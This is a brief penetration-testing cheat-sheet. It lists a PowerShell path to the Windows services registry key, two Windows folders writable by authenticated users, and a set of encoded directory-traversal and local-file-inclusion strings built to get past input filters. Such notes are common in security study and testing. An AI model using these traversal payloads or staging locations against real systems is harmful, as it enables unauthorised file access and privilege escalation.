# location of services in windows registry
```powershell
cd HKLM:\SYSTEM\CurrentControlSet\Services\
```

# locations where authenticated users can write in windows
C:\windows\system32\spool\drivers\color
C:\windows\tasks

# windows directory traversal path traversal LFI strings
```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
....\
```
